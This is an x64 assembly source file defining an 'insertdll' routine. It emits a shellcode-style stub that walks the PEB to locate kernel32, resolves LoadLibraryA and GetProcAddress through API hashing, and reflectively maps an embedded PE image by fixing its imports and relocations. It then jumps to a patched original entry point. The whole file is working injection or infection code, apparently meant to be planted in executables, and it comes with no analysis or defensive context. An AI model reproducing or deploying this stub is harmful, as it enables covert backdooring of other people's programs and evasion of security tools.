.data					;数据段	
.code					;代码段

insertdll   proc
mov rax,cstart
mov rdx,cend
sub rdx,rax
mov qword ptr [rcx],rdx
ret
cstart:
mov r12,1234567812345678h   ;入口
mov r15,1234567812345678h   ;插入代码偏移
mov r13,gs:[60h]

mov rax,0b22b0f2c5a666505h	;hash of LoadLibraryA
push rax
mov rax,2b3def2c9071f059h	;hash of GetProcAddress
push rax
mov rsi,rsp
mov rdi,rsp
sub rsp,40h
mov r11,qword ptr [r13+18h]
mov r11,qword ptr [r11+30h]
mov r11,qword ptr [r11]
mov r11,qword ptr [r11]
mov rbp,qword ptr [r11+10h]	;kernel32

mov ebx, dword ptr [rbp + 3ch] 
mov ecx, dword ptr [rbp + rbx + 88h]
add rcx, rbp


find_lib_functions: 
lodsq
find_functions:
push rax
push rsi
push rdi

mov ebx, dword ptr [rcx + 20h] 
add rbx, rbp

xor rdi, rdi
next_function_loop: 
mov esi, dword ptr [rbx + rdi * 4]
add rsi, rbp
xor rdx, rdx
hash_loop: 
movsx rax, byte ptr[rsi]
cmp al,ah
jz compare_hash
ror rdx,7
add rdx,rax
inc rsi
jmp hash_loop
compare_hash: 
cmp rdx, [rsp + 10h]
jz next_out
inc rdi
jmp next_function_loop 
next_out:
mov ebx, dword ptr [rcx + 24h]
add rbx, rbp
movzx rdi, word ptr [rbx + 2 * rdi]
mov ebx, dword ptr [rcx + 1ch]
add rbx, rbp
mov eax, dword ptr [rbx + 4 * rdi]
add rax,rbp
pop rdi
stosq
pop rsi 
pop rax
mov rdx,0b22b0f2c5a666505h
cmp rax,rdx
jne find_lib_functions 



mov r13,[r13+10h]
add r12,r13
add r15,r13

mov r14d,dword ptr [r15+3ch]
add r14,r15

mov ebp,dword ptr [r14+90h]
add rbp,r15
importloop:
mov ecx,dword ptr [rbp+0ch]
cmp rcx,0
jz importout
add rcx,r15
mov rax,qword ptr [rsp+48h]
push rcx
call rax
pop rcx
mov rcx,rax

mov ebx,dword ptr [rbp+10h]
add rbx,r15
fitloop:
mov rdx,qword ptr [rbx]
cmp rdx,0
jz fitout
add rdx,r15
add rdx,2
mov rax,qword ptr [rsp+40h]
push rcx
sub rsp,20h
push rcx
push rdx
call rax
add rsp,30h
pop rcx
mov qword ptr [rbx],rax
add rbx,8h
jmp fitloop
fitout:
add rbp,14h
jmp importloop
importout:
add rsp,50h

mov r10,qword ptr [r14+30h]
mov edx,dword ptr [r14+0b0h]
add rdx,r15
mov r8d,dword ptr [r14+0b4h]
add r8,rdx

relocloop:
cmp rdx,r8
jz relocout
mov eax,dword ptr [rdx]
mov ecx,dword ptr [rdx+4]
add rcx,rdx
add rdx,8
rloop:
cmp rdx,rcx
jz relocloop
movzx r9,word ptr [rdx]
add rdx,2
cmp r9,0
jz rloop
and r9w,0fffh
add r9,rax
add r9,r15
mov r11,qword ptr [r9]
sub r11,r10
add r11,r15
mov qword ptr [r9],r11
jmp rloop
relocout:

mov eax,dword ptr [r14+88h]
add rax,r15
mov eax,dword ptr [rax+1ch]
add rax,r15
mov eax,dword ptr [rax]
add rax,r15
call rax
jmp r12
cend:
ret
insertdll  endp

end